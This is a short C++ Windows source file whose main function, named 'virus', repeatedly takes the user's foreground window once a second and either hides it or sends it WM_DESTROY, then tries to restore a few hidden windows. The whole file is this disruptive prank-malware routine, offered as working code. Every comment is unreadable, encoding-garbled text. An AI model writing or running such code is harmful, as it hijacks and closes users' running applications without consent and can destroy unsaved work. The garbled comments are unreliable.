#include <Windows.h>
#include "Header.h"

//������� ������������ ������� �������� ����
HWND Activetes()
{
    HWND ActiveWindow = GetForegroundWindow();
    //int Actives = GetWindowTextA(ActiveWindow, title, 256);
    return ActiveWindow;
}

//���� ���� ������
void virus()
{
    int a = 0;
    while (a < times)
    {
        //�������� ���������� �������� ��������� ����
        HWND Active = Activetes();
        //������ � ���������� ��������� ������� ������ � �������� ������
        //���� ��� = 1 �� �� ������ �������� �������� ����
        if (mode == 1)
        {
            ShowWindow(Active, SW_HIDE);
        }
        //���� ��� = 2 �� ������ ����, ��� �� �������� ���� �� �������� �� ���������, ��� �� ��� ���������(WM_DESTROY)
        else if (mode == 2)
        {
            SendMessage(Active, WM_DESTROY, 0, 0);
        }
        //��������� � ������ � ����������� �� ������� �� ������/�������(�������������� �������� �� �������� �� ���������� �����)
        actives[a] = Active;
        a++;
        Sleep(1000);
    }
    //������� ���������� ��� ��������� ������� ������
    for (int i = 0; i < 10; i++)
    {
        //���� ������� ����������� �� ������ ������� �������� �������� � ���������� ��(�������������� ��������, ��� ���������� �� �����)
        ShowWindow(actives[i], SW_SHOW);
    }
}